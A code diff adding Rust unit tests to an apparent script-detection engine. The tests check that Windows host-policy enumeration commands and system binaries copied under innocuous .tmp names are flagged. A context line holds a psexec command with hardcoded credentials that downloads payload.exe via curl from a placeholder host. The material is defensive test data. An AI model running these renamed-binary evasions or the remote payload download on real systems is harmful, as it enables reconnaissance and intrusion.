@@ -4355,6 +4355,82 @@ C:\Users\Public\st.tmp /query /fo LIST
     }
 
     #[test]
+    fn host_policy_posture_commands_emit_enumeration_traits() {
+        let report = analyze(
+            br#"gpresult /r
+driverquery /v
+auditpol /get /category:*
+dsregcmd /status
+"#,
+            &AnalyzeConfig::default(),
+        );
+
+        for (kind, command) in [
+            ("gpresult", "gpresult /r"),
+            ("driverquery", "driverquery /v"),
+            ("auditpol", "auditpol /get /category:*"),
+            ("dsregcmd", "dsregcmd /status"),
+        ] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::Enumeration { enum_kind, command: c }
+                        if enum_kind == kind && c == command
+                )),
+                "missing host posture enumeration {kind}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
+    fn copied_host_policy_posture_aliases_emit_enumeration_traits() {
+        let script = br#"copy C:\Windows\System32\gpresult.exe C:\Users\Public\gp.tmp
+C:\Users\Public\gp.tmp /r
+copy C:\Windows\System32\driverquery.exe C:\Users\Public\dq.tmp
+C:\Users\Public\dq.tmp /v
+copy C:\Windows\System32\auditpol.exe C:\Users\Public\ap.tmp
+C:\Users\Public\ap.tmp /get /category:*
+copy C:\Windows\System32\dsregcmd.exe C:\Users\Public\dr.tmp
+C:\Users\Public\dr.tmp /status
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        for target in [
+            r#"C:\Users\Public\gp.tmp"#,
+            r#"C:\Users\Public\dq.tmp"#,
+            r#"C:\Users\Public\ap.tmp"#,
+            r#"C:\Users\Public\dr.tmp"#,
+        ] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::ManipulatedExec { target: t, .. }
+                        if t.eq_ignore_ascii_case(target)
+                )),
+                "copied host posture alias {target} was not surfaced: {:?}",
+                report.traits
+            );
+        }
+        for (kind, command) in [
+            ("gpresult", "gpresult.exe /r"),
+            ("driverquery", "driverquery.exe /v"),
+            ("auditpol", "auditpol.exe /get /category:*"),
+            ("dsregcmd", "dsregcmd.exe /status"),
+        ] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::Enumeration { enum_kind, command: c }
+                        if enum_kind == kind && c == command
+                )),
+                "missing copied host posture enumeration {kind}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
     fn psexec_replays_remote_cmd_child() {
         let script = br#"psexec \\target.example -u admin -p pass cmd.exe /V:ON /c set U=https://psexec-wrapper.example/payload.exe&&curl -o payload.exe !U!"#;
         let report = analyze(script, &AnalyzeConfig::default());
